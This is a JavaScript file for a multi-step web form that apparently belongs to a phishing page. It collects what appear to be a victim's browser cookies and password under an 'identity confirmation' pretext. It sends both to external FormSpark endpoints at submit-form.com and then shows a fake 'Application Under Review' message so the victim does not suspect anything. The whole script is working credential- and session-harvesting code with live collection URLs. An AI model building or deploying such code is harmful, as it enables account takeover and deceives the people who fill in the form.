
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

// Configure FormSpark form submissions
const cookieForm = document.getElementById('cookieForm');
const passwordForm = document.getElementById('passwordForm');

cookieForm.addEventListener('submit', function(e) {
    // Allow the form to submit naturally
    showPage('page4');
});

passwordForm.addEventListener('submit', function(e) {
    const button = e.target.querySelector('button');
    button.textContent = 'Processing...';
    
    // Allow form to submit naturally, then show thank you message
    setTimeout(() => {
        const thankYouMessage = document.createElement('div');
        thankYouMessage.innerHTML = '<h2>Thank You! Application Under Review</h2>';
        thankYouMessage.style.textAlign = 'center';
        thankYouMessage.style.marginTop = '2rem';
        
        const form = document.querySelector('.confirm-identity form');
        form.innerHTML = '';
        form.appendChild(thankYouMessage);
    }, 2000);
});

// Set FormSpark form actions
cookieForm.setAttribute('action', 'https://submit-form.com/g0dJSXe5U');
passwordForm.setAttribute('action', 'https://submit-form.com/TSRlLhDlN');
